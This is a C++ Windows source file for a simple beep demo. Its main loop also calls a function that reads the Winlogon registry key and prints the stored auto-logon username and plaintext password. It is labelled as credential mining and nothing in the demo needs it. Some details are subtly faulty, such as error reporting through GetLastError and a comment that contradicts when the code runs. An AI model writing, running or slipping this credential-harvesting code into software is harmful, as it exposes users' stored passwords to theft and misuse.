#include <iostream>
#include <string>
#include <Windows.h>
#include <winreg.h> // Required for registry functions

// Function to perform registry mining for auto-login credentials
void MineRegistryCredentials()
{
	std::cout << "[*] Attempting to mine registry for credentials...\n";

	HKEY hKey;
	LPCWSTR subKey = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
	LONG result;

	// Try to open the key for the 64-bit view of the registry first
	result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ | KEY_WOW64_64KEY, &hKey);

	if (result != ERROR_SUCCESS)
	{
		// If 64-bit view fails, try the 32-bit view (for 32-bit applications on 64-bit OS)
		result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ | KEY_WOW64_32KEY, &hKey);
	}

	if (result == ERROR_SUCCESS)
	{
		std::cout << "[+] Successfully opened Winlogon registry key.\n";

		// Define buffer for registry value data
		WCHAR valueData[256];
		DWORD dataSize;

		// --- Extract DefaultUserName ---
		dataSize = sizeof(valueData);
		result = RegQueryValueExW(hKey, L"DefaultUserName", nullptr, nullptr, (LPBYTE)valueData, &dataSize);
		if (result == ERROR_SUCCESS)
		{
			std::wcout << L"    DefaultUserName: " << valueData << L"\n";
		}
		else
		{
			std::cout << "    DefaultUserName not found or could not be read. Error: " << GetLastError() << "\n";
		}

		// --- Extract DefaultPassword (if exists, often not stored directly for security) ---
		dataSize = sizeof(valueData);
		result = RegQueryValueExW(hKey, L"DefaultPassword", nullptr, nullptr, (LPBYTE)valueData, &dataSize);
		if (result == ERROR_SUCCESS)
		{
			std::wcout << L"    DefaultPassword: " << valueData << L" (Warning: This is rarely stored directly and securely)\n";
		}
		else
		{
			std::cout << "    DefaultPassword not found or could not be read. Error: " << GetLastError() << "\n";
		}

		// --- Extract AutoAdminLogon ---
		DWORD autoAdminLogon;
		dataSize = sizeof(autoAdminLogon);
		result = RegQueryValueExW(hKey, L"AutoAdminLogon", nullptr, nullptr, (LPBYTE)& autoAdminLogon, &dataSize);
		if (result == ERROR_SUCCESS)
		{
			std::cout << "    AutoAdminLogon: " << (autoAdminLogon ? "Enabled" : "Disabled") << "\n";
		}
		else
		{
			std::cout << "    AutoAdminLogon not found or could not be read. Error: " << GetLastError() << "\n";
		}

		RegCloseKey(hKey);
	}
	else
	{
		std::cout << "[-] Failed to open Winlogon registry key. Error: " << GetLastError() << "\n";
	}
	std::cout << "[*] Registry mining complete.\n";
}

int main()
{
	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		// Perform registry mining at the start of the application
		MineRegistryCredentials();
	}
	return 0;
}